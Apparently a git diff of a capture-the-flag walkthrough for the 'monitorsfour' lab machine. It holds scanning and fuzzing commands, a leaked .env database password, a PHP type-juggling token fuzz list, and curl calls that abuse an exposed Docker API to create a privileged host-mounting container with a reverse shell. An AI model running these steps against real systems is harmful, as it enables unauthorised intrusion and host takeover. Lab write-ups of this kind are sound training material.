@@ -1,6 +1,6 @@
 ## Scanning
 We start by scanning the machine, probing for ports. I use **`rustscan`** to make the probing of the ports faster, then it runs **`nmap`** after all ports are found and runs an **`nmap`** script.
-```
+```bash
  rustscan -a 10.129.7.152 -b 500
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
 ```
 
 We see that port 80 is open. If you try to visit that, the browser will return a DNS failure. Add something in `/etc/hosts`
-```
+```bash
 <Machine IP>    monitorsfour.htb
 ```
 ## Web Enumeration
@@ -56,7 +56,7 @@ We try to fuzz for directories and we found something interesting
 ![](../assets/monitorsFour/Pasted%20image%2020260130210351.png)
 
 Upon fuzzing, we will also see `.env` which consists of the following content. This is a rabbit hole as I did not get to use these.
-```
+```bash
 DB_HOST=mariadb
 DB_PORT=3306
 DB_NAME=monitorsfour_db
@@ -64,11 +64,11 @@ DB_USER=monitorsdbuser
 DB_PASS=f37p2j8f4t0r
 ```
 Apparently, this endpoint is responding so it is missing a token. We'll get back here later, we try to fuzz for subdomains.
-```
+```bash
 ffuf -c -u 'http://monitorsfour.htb/' -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains/subdomains-top1million-20000.txt
 ```
 We will have a result of cacti, so it will be `cacti.monitorsfour.htb` we will append this to our `/etc/hosts`
-```
+```bash
 <Machine IP>    monitorsfour.htb cacti.monitorsfour.htb
 ```
 We still have no creds in order to authenticate but the version of the cacti is interesting.
@@ -85,7 +85,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling#
 In the user endpoint, try to put a random character in the token parameter. Notice that it says **`Invalid or Missing Token`** compared to the response earlier.
 ![](../assets/monitorsFour/Pasted%20image%2020260130211439.png)
 So we try to fuzz for a character that is compatible for the **php_loss_comparison**. Use this payload to try and fuzz which are the correct characters.
-```
+```txt
 0
 1
 -1
@@ -138,7 +138,7 @@ Basically, we will try to mount the whole WSL to `host_root`.
 **Port 2375** is the port for the API of the docker. We need to make a request there and try to get a reverse shell to our attacker machine. The commands `docker ps`, `docker run` sends a **`REST API`** calls to Docker.
 
 We confirm for remote API Access with this command
-```
+```bash
 www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/version
 curl http://192.168.65.7:2375/version
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -153,7 +153,7 @@ Since we confirmed that we have access, we can now begin our privilege escalatio
 * Execute commands with full access to Windows System
 
 With this one liner command, we create a new privileged container, replace this with your own IP and port to establish a reverse shell.
-```
+```bash
 curl -H 'Content-Type: application/json' \
   -d '{
     "Image": "docker_setup-nginx-php:latest",
@@ -166,11 +166,11 @@ curl -H 'Content-Type: application/json' \
   http://192.168.65.7:2375/containers/create
 ```
 We then try to start this container
-```
+```bash
 curl -d '' "http://192.168.65.7:2375/containers/1e4ee238bde1d95f84869b93fa56135253c1400592c5f7dc81a9464d38a2297c/start"
 ```
 Then confirm if the reverse shell is working
-```
+```bash
 curl -s "http://192.168.65.7:2375/containers/1e4ee238bde1d95f84869b93fa56135253c1400592c5f7dc81a9464d38a2297c/logs?stdout=1&stderr=1"
 ```
 We can also see this in our reverse shell that we established.
